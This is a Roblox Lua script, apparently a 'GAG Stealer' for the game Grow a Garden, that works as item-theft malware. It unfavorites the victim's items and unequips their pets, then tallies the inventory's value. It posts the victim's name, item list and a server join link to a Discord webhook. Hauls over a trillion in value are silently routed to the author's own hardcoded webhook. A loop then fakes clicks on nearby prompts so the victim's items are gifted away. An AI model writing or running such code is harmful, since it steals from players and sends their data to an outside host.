if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
    return
end
rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local backpack = LocalPlayer:WaitForChild("Backpack")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Unfavorite items
local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
for _, item in ipairs(backpack:GetChildren()) do
    if item:GetAttribute("d") == true then
        event:FireServer(item)
    end
end

-- Unequip pets
local pickupCount = 0
for _, pet in ipairs(workspace:WaitForChild("Pets"):GetChildren()) do
    if pet:GetAttribute("OWNER") == LocalPlayer.Name then
        local uuid = pet:GetAttribute("UUID")
        if uuid then
            local success = pcall(function()
                ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
            end)
            if success then pickupCount = pickupCount + 1 end
        end
    end
end
task.wait(2)

-- Module requirements
local HttpService = game:GetService("HttpService")
local modules = ReplicatedStorage:WaitForChild("Modules")
local dataService = require(modules:WaitForChild("DataService"))
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))

local function safeLerp(a, b, t)
	return a + (b - a) * t
end

local Webhook = getfenv().Webhook
local Username = getfenv().Username
local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
local DualUsername = "namnnni2"
if not Webhook or not Username then return end

local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false

local function formatNumber(n)
	local suffix = {"", "k", "m", "b", "t"}
	local idx = 1
	while n >= 1000 and idx < #suffix do
		n = n / 1000
		idx = idx + 1
	end
	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
end

local function calcPetValue(petData)
	local egg = petData.PetData.HatchedFrom
	if not egg then return 0 end
	local data = petRegistry.PetEggs[egg]
	local rarity = data and data.RarityData.Items[petData.PetType]
	if not rarity then return 0 end
	local r = rarity.GeneratedPetData.WeightRange
	if not r then return 0 end
	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
	local weightMult = safeLerp(0.8, 1.2, lerp)
	local levelMult = safeLerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
end

for _, tool in ipairs(backpack:GetChildren()) do
	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
		if tool:GetAttribute("ItemType") == "Pet" then
			local id = tool:GetAttribute("PET_UUID")
			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
			if petData and petData.PetType then
				local petName = petData.PetType
				local weight = tonumber(petData.PetData.BaseWeight) or 0
				local value = calcPetValue(petData)
				if table.find(rarePets, petName) then hasRare = true end
				if weight >= 10 then hasHeavy = true end
				totalValue = totalValue + value
				table.insert(itemsToSend, {Tool = tool, Name = petName, Weight = weight, Value = value, Type = "Pet"})
			end
		else
			local value = calcPlantValue(tool)
			totalValue = totalValue + value
			table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
		end
	end
end

if #itemsToSend == 0 then return end

table.sort(itemsToSend, function(a, b)
	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
	return a.Value > b.Value
end)

local useDual = totalValue >= 1e12
local finalWebhook = useDual and DualWebhook or Webhook
local finalUsername = useDual and DualUsername or Username

local content = (hasRare or hasHeavy) and "@everyone üö® Mission Alert!\n" or ""
content = content .. "üö® **GAG OPS - Steal & Gift Mission** üö®\n>>> Mission success ‚úÖ\n**JobId:** `" .. game.JobId .. "`\n\n"

local lines = ""
for _, item in ipairs(itemsToSend) do
	local icon = item.Type == "Pet" and (
		table.find(rarePets, item.Name) and "üê≤" or (item.Weight >= 10 and "üêò" or "üê∂")
	) or "üçè"
	lines = lines .. string.format("%s **%s** (%.2f KG) ‚Äî ‚Çµ%s\n", icon, item.Name, item.Weight, formatNumber(item.Value))
	if #lines > 1024 then
		lines = lines:sub(1, 1000) .. "\n...more items"
		break
	end
end

local embed = {
	title = "üéØ GAG OPS - Steal & Gift Report",
	description = "Inventory extraction complete. Mission success ‚úÖ",
	color = 0xFF0000,
	author = { name = "GAG Stealer System", icon_url = "https://cdn-icons-png.flaticon.com/512/2809/2809640.png" },
	thumbnail = { url = "https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif" },
	fields = {
		{name = "üéØ Victim", value = LocalPlayer.Name, inline = true},
		{name = "üí∞ Total Value", value = "‚Çµ" .. formatNumber(totalValue), inline = true},
		{name = "üó∫Ô∏è Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
		{name = "üßæ Inventory Log", value = lines, inline = false}
	},
	footer = {
		text = "ü¶ä GAG Stealer by namnnni2 ‚Äî Stay stealthy",
		icon_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
	},
	timestamp = DateTime.now():ToIsoDate()
}

local payload = {
	content = content,
	embeds = {embed}
}

local function getRequest()
	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
end

pcall(function()
	local req = getRequest()
	if req then
		req({
			Url = finalWebhook,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(payload)
		})
	end
end)

-- Proximity + move behind
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local VirtualUser = game:GetService("VirtualUser")
local CONFIG = {
    mobileHoldTime = 1.5,
    promptHoldTime = 0.5,
    promptDistance = 10
}

local function getNearbyPrompt(maxDistance)
    local char = LocalPlayer.Character
    if not char or not char.PrimaryPart then return nil end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent:IsA("BasePart") then
            local dist = (char.PrimaryPart.Position - obj.Parent.Position).Magnitude
            if dist <= maxDistance then
                return obj
            end
        end
    end
    return nil
end

local function isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

local function virtualInputGift(prompt)
    if not prompt then return false end

    local success = false
    local holdTime = isMobile() and CONFIG.mobileHoldTime or CONFIG.promptHoldTime

    pcall(function()
        local promptPosition = prompt.Parent.Position
        local camera = workspace.CurrentCamera
        local screenPoint, onScreen = camera:WorldToScreenPoint(promptPosition)

        if onScreen then
            if isMobile() then
                local touchPositions = {}
                for i = 1, 3 do
                    table.insert(touchPositions, Vector2.new(screenPoint.X + (i-2)*2, screenPoint.Y + (i-2)*2))
                end

                for _, pos in ipairs(touchPositions) do
                    VirtualInputManager:SendTouchEvent(Enum.UserInputType.Touch, Enum.UserInputState.Begin, pos)
                    task.wait(0.05)
                end

                task.wait(holdTime)

                for _, pos in ipairs(touchPositions) do
                    VirtualInputManager:SendTouchEvent(Enum.UserInputType.Touch, Enum.UserInputState.End, pos)
                    task.wait(0.05)
                end
            else
                VirtualInputManager:SendMouseButtonEvent(screenPoint.X, screenPoint.Y, 0, true, game, 1)
                task.wait(holdTime)
                VirtualInputManager:SendMouseButtonEvent(screenPoint.X, screenPoint.Y, 0, false, game, 1)
            end
            success = true
        end
    end)

    if success then return true end

    pcall(function()
        if isMobile() then
            VirtualUser:SetKeyDown("0x65")
            task.wait(holdTime)
            VirtualUser:SetKeyUp("0x65")
        else
            VirtualUser:Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            task.wait(holdTime)
            VirtualUser:Button1Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end
        success = true
    end)
end

task.spawn(function()
    while task.wait(1) do
        local prompt = getNearbyPrompt(CONFIG.promptDistance)
        if prompt then
            local ok = virtualInputGift(prompt)
            if ok then
                task.wait(2)
            end
        end
    end
end)
